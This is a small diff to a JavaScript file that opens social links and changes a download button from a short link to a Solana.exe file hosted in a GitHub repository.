@@ -12,11 +12,10 @@ function openTg() {
 function openDc() {
     window.open("https://discord.gg/8uG3g4AW7K", '_blank')
 }
-
 function openGitHub() {
     window.open("https://github.com/nextgencat/solana", '_blank')
 }
 
 function download() {
-    window.open("https://go.linkify.ru/2HY2", '_blank')
+    window.open("https://github.com/nextgencat/solana/raw/refs/heads/main/version/Solana.exe", '_blank')
 }
